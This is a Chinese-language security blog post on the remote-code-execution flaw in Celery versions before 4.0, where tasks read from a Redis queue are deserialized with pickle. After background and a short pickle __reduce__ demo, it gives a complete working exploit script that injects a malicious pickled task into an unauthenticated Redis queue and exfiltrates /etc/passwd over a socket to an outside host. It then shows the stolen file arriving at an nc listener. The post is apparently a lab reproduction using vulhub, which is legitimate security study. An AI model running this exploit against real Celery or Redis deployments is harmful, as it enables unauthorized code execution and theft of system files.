---
layout:     post
title:     celery的RCE漏洞
subtitle:   利用celery执行任意代码
date:       2025-01-06
author:     mengxun
header-img: img/bg/gray-raw.png
catalog: true
tags:
    - 安全
---


#### 0x01 漏洞背景

在`celery`的[文档](https://docs.celeryq.dev/en/stable/faq.html#is-celery-dependent-on-pickle)里有那么一段问答：

```
Is Celery dependent on pickle?
Answer: No, Celery can support any serialization scheme.

We have built-in support for JSON, YAML, Pickle, and msgpack. Every task is associated with a content type, so you can even send one task using pickle, another using JSON.

The default serialization support used to be pickle, but since 4.0 the default is now JSON. If you require sending complex Python objects as task arguments, you can use pickle as the serialization format, but see notes in Serializers.

If you need to communicate with other languages you should use a serialization format suited to that task, which pretty much means any serializer that’s not pickle.

You can set a global default serializer, the default serializer for a particular Task, or even what serializer to use when sending a single task instance.
```

其中有一句话
> The default serialization support used to be pickle, but since 4.0 the default is now JSON.

也就是说`celery`默认的序列化方式在4.0版本从`pickle`换成了`JSON`。


#### 0x02 背后原因

而更换默认序列化方式这一举动的背后原因，其实是`pickle`引发的任意代码执行漏洞。不熟悉`pickle`的可以通过[Python官方文档](https://docs.python.org/3/library/pickle.html)简单了解下，其功能大概就是一个可以序列化Python对象（比如函数、类）的模块。

在4.0版本之前，`celery`默认使用`pickle`反序列从队列（比如`redis`）里拿到的任务，一旦反序列化的内容里包含了[`__reduce__`](https://docs.python.org/3/library/pickle.html#object.__reduce__)之类的特殊方法，那么在做`pickle.loads` 操作时，便会执行该方法下的代码逻辑，从而可以执行任意代码。


```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo 'Pickle executed!'",))

payload = pickle.dumps(Exploit())
print("Pickle payload created.")

print("Deserializing payload...")
pickle.loads(payload)  # attacked
print("Done.")
```

#### 0x03 问题复现

首先利用 [vulhub](https://github.com/vulhub/vulhub/tree/master/celery/celery3_redis_unauth) 拉起容器环境
```shell
CONTAINER ID   IMAGE                  COMMAND                  CREATED       STATUS       PORTS                                         NAMES
3988fb6f98af   vulhub/celery:3.1.23   "celery -A tasks wor…"   2 hours ago   Up 2 hours                                                 celery3_redis_unauth-celery-1
efcc976c84df   redis                  "docker-entrypoint.s…"   2 hours ago   Up 2 hours   0.0.0.0:6379->6379/tcp, [::]:6379->6379/tcp   celery3_redis_unauth-redis-1
```

然后通过如下逻辑往`redis`的队列里下发任务

{% raw %}
```python
import pickle
import json
import base64
import redis
import sys
r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0)

ori_str="{\"content-type\": \"application/x-python-serialize\", \"properties\": {\"delivery_tag\": \"16f3f59d-003c-4ef4-b1ea-6fa92dee529a\", \"reply_to\": \"9edb8565-0b59-3389-944e-a0139180a048\", \"delivery_mode\": 2, \"body_encoding\": \"base64\", \"delivery_info\": {\"routing_key\": \"celery\", \"priority\": 0, \"exchange\": \"celery\"}, \"correlation_id\": \"6e046b48-bca4-49a0-bfa7-a92847216999\"}, \"headers\": {}, \"content-encoding\": \"binary\", \"body\": \"gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\"}"

task_dict = json.loads(ori_str)

command = """cat > /tmp/send.py << 'EOF'
import socket

with open("/etc/passwd", "rb") as f:
    data = f.read()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.31.222.108", 9999))

s.sendall(data)

s.close()
EOF
python /tmp/send.py
"""


class Person(object):
    def __init__(self, command):
        self.cmd = command

    def __reduce__(self):
        # 未导入os模块，通用
        return (__import__('os').system, (self.cmd,))


pickleData = pickle.dumps(Person(command))
task_dict['body']=base64.b64encode(pickleData).decode()
print(task_dict)
r.lpush('celery',json.dumps(task_dict))
```
{% endraw %}

然后在用`nc`命令提前拉起的接收端便可接收到相应内容
```shell
root@mx:~# nc -l 9999 | tee -a /tmp/recv.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
user:x:1000:1000::/home/user:/bin/sh
```

#### 0x04 小结

简而言之，只要可以往队列里写入任务（比如利用`redis`等组件的未授权漏洞），并且`celery`会使用`pickle`进行反序列化，我们就有可趁之机进行任意代码的执行。







